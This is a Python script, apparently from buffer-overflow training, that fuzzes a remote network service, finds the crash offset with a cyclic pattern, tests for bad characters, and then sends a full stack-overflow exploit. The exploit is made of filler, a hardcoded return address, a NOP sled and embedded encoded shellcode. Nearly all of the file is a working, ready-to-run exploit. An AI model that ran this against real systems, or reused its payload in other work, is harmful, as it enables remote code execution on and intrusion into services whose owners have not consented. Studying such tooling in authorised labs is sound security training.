import argparse
import socket
import sys
import time

def connect(ip,port):
    s = socket.socket()
    s.connect((ip, port))
    s.settimeout(5)
    return s

def parse_bytes(b):
    tab = b.split('\\x')[1:]
    return b''.join([bytes.fromhex(x) for x in tab])

print()
parser = argparse.ArgumentParser(description='Binary fuzzer')
group1 = parser.add_argument_group('Basics')
group1.add_argument('-i', '--ip', metavar='', required=True, help='IP to fuzz')
group1.add_argument('-p', '--port', metavar='', required=True, type=int, help='Port to fuzz')
group1.add_argument('-m', '--mode', metavar='', required=True, choices=['fuzz', 'pattern', 'badchars', 'exploit'], help='fuzz|pattern|badchars|exploit')

group2 = parser.add_argument_group('Payload customization')
group2.add_argument('-o', '--offset', metavar='', type=int, help='offset')
group2.add_argument('-b', '--before', metavar='', help='String to add before payload')
group2.add_argument('-a', '--after', metavar='', help='String to add after payload')
group2.add_argument('-x', '--badchars', metavar='', help='Already known badchars')
group2.add_argument('-e', '--eip', metavar='', help='Value to put in EIP')

group3 = parser.add_argument_group('Misc')
group3.add_argument('-r', '--reconnect', action='store_true', help='Reconnect each try')
args = parser.parse_args()

offset = args.offset or 0
before = args.before.encode() if args.before else b''
after = args.after.encode() if args.after else b'\n'
badchars = parse_bytes(args.badchars) if args.badchars else b'\x00'
eip_placeholder = parse_bytes(args.eip) if args.eip else b'\xef\xbe\xad\xde'
nb_tries = 1
fuzz_step = 100


fillchar = b'A'
allchars = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

testchars = bytes([x for x in allchars if x not in badchars])

badchars = b'\x00\x0a'


s = connect(args.ip, args.port)

if args.mode == "fuzz":
    while True:
        try:

            fuzz = fillchar * (fuzz_step * nb_tries)
            print(f"\rFuzzing with {len(fuzz)} bytes")
            
            payload = before + fuzz + after
            s.send(payload)

            s.recv(1024)
            nb_tries += 1
            time.sleep(.1)

            if args.reconnect:
                s.close()
                s = connect(args.ip, args.port)

        except Exception as e:
            print(f"Crashed, fuzz = {len(fuzz)} bytes, total = {len(payload)} bytes")
            break

elif args.mode == "pattern":
    payload = before + pattern + after

    #print(f"[+] sending {payload}")
    s.send(payload)
    s.recv(1024)

elif args.mode == "badchars":
    payload = before + (fillchar * offset) + eip_placeholder + testchars + after

    #print(f"[+] sending {payload}")
    s.send(payload)
    s.recv(1024)

elif args.mode == "exploit":

    shellcode = b"\xda\xd8\xb8\x45\x8f\x91\x35\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x52\x83\xc7\x04\x31\x47\x13\x03\x02\x9c\x73\xc0\x70\x4a\xf1\x2b\x88\x8b\x96\xa2\x6d\xba\x96\xd1\xe6\xed\x26\x91\xaa\x01\xcc\xf7\x5e\x91\xa0\xdf\x51\x12\x0e\x06\x5c\xa3\x23\x7a\xff\x27\x3e\xaf\xdf\x16\xf1\xa2\x1e\x5e\xec\x4f\x72\x37\x7a\xfd\x62\x3c\x36\x3e\x09\x0e\xd6\x46\xee\xc7\xd9\x67\xa1\x5c\x80\xa7\x40\xb0\xb8\xe1\x5a\xd5\x85\xb8\xd1\x2d\x71\x3b\x33\x7c\x7a\x90\x7a\xb0\x89\xe8\xbb\x77\x72\x9f\xb5\x8b\x0f\x98\x02\xf1\xcb\x2d\x90\x51\x9f\x96\x7c\x63\x4c\x40\xf7\x6f\x39\x06\x5f\x6c\xbc\xcb\xd4\x88\x35\xea\x3a\x19\x0d\xc9\x9e\x41\xd5\x70\x87\x2f\xb8\x8d\xd7\x8f\x65\x28\x9c\x22\x71\x41\xff\x2a\xb6\x68\xff\xaa\xd0\xfb\x8c\x98\x7f\x50\x1a\x91\x08\x7e\xdd\xd6\x22\xc6\x71\x29\xcd\x37\x58\xee\x99\x67\xf2\xc7\xa1\xe3\x02\xe7\x77\xa3\x52\x47\x28\x04\x02\x27\x98\xec\x48\xa8\xc7\x0d\x73\x62\x60\xa7\x8e\xe5\x4f\x90\xa8\x92\x27\xe3\xc8\x7f\x91\x6a\x2e\x15\xf1\x3a\xf9\x82\x68\x67\x71\x32\x74\xbd\xfc\x74\xfe\x32\x01\x3a\xf7\x3f\x11\xab\xf7\x75\x4b\x7a\x07\xa0\xe3\xe0\x9a\x2f\xf3\x6f\x87\xe7\xa4\x38\x79\xfe\x20\xd5\x20\xa8\x56\x24\xb4\x93\xd2\xf3\x05\x1d\xdb\x76\x31\x39\xcb\x4e\xba\x05\xbf\x1e\xed\xd3\x69\xd9\x47\x92\xc3\xb3\x34\x7c\x83\x42\x77\xbf\xd5\x4a\x52\x49\x39\xfa\x0b\x0c\x46\x33\xdc\x98\x3f\x29\x7c\x66\xea\xe9\x9c\x85\x3e\x04\x35\x10\xab\xa5\x58\xa3\x06\xe9\x64\x20\xa2\x92\x92\x38\xc7\x97\xdf\xfe\x34\xea\x70\x6b\x3a\x59\x70\xbe"
    nop_after = b'\x90' * 0
    nop_before = b'\x90' * 100
    eip_placeholder = b'\xc3\x14\x04\x08'
    #080414C3
    payload = before + (fillchar * offset) + eip_placeholder + nop_before + shellcode + nop_after + after

    s.send(payload)
    s.recv(1024)


s.close()